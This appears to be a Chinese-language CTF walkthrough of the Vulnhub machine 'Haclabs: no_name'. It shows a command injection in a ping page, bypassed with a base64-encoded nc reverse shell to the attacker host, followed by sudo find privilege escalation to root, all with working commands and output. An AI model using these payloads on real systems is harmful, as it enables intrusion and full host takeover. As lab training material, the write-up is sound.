---
layout: post
title: "Haclabs:no_name walkthrough"
date: 2021-07-04
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.1.115` |
| Kali          | `192.168.1.116` |
| No Name       | `192.168.1.118` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.1.118`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.1.118
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 07:38 UTC
Nmap scan report for 192.168.1.118
Host is up (0.013s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
```

结果中没什么值得注意的地点，那么下一步进行目录枚举，并且在*/admin*目录下发现4张图片，其中*ctf-01.jpg*图片比较可疑（以为是第一关），经过图片隐写等一系列骚操作后一无所获，然而是我想多了。。。

之后经过*dirb*暴力枚举发现了另一个页面：`/superadmin.php`

```shell
┌──(root💀kali)-[/usr/share/dirb/wordlists]
└─# dirb http://192.168.1.118 /usr/share/wordlists/dirb/big.txt -X .php
...
---- Scanning URL: http://192.168.1.118/ ----
+ http://192.168.1.118/index.php (CODE:200|SIZE:201)
+ http://192.168.1.118/superadmin.php (CODE:200|SIZE:152)
...
```

### Getshell

该页面的功能是进行ping IP地址，这里就立刻想到了命令注入。果然尝试后发现的确存在命令注入，依次进行测试：

```shell
127.0.0.1|id	-> Y
127.0.0.1|nc 192.168.1.116 5566   -> N
|nc.traditional -e /bin/bash 192.168.1.116 5566	  -> N
```

之后想到我们可以查看*superadmin.php*源码，命令：`| cat superadmin.php`

```php
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```

代码比较简单，对`$_POST['pinger']`参数传递的值进行过滤，并且前后需一致才能执行`shell_exec()`，因此只要传递的值不包含匹配的内容即可，那么可以输入以下命令即可getshell。

```shell
| `echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS4xMTYgNTU2Ng==" | base64 -d `
```
### 提权

```bash
┌──(root💀kali)-[/usr/share/dirb/wordlists]
└─# nc -lvp 5566
listening on [any] 5566 ...
192.168.1.118: inverse host lookup failed: Unknown host
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.118] 44548
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@haclabs:/var/www/html$
```

在*/home/yash*找到第一个flag：

```bash
www-data@haclabs:/home/yash$ cat flag1.txt
Due to some security issues,I have saved haclabs password in a hidden file.
```

并且提示信息告诉我们需要找一个隐藏文件，猜测文件前有个`.`，不过需要注意文件所属用户是*yash*，那么使用*find*命令进行查找：

```bash
www-data@haclabs:/home/yash$ find / -type f -user yash 2>/dev/null
/home/yash/flag1.txt
/home/yash/.bashrc
/home/yash/.cache/motd.legal-displayed
/home/yash/.profile
/home/yash/.bash_history
/usr/share/hidden/.passwd
```

查看*.passwd*文件得到密码：`haclabs1234`，使用密码切换到*haclabs*用户后在，在*/home/haclabs*目录下得到第二个flag：

```shell
haclabs@haclabs:~$ cat flag2.txt
I am flag2

           ---------------               ----------------


                               --------
```

并且在执行*sudo -l*命令后知道该用户可执行具有SUID权限的*/usr/bin/find*工具，并且该命令中的`-exec`可执行命令。

```shell
haclabs@haclabs:~$ sudo -u root find . -exec /bin/bash \; -quit
root@haclabs:~# id
uid=0(root) gid=0(root) groups=0(root)
root@haclabs:~# cat flag3.txt
Congrats!!!You completed the challenege!



                                                   ()    ()

                                                 \          /
                                                  ----------
```

### 总结

- `find`工具执行命令：`find . -exec id \; -quit`
- `nc`工具进行反向shell：`nc -e /bin/bash 192.168.1.116 5566`

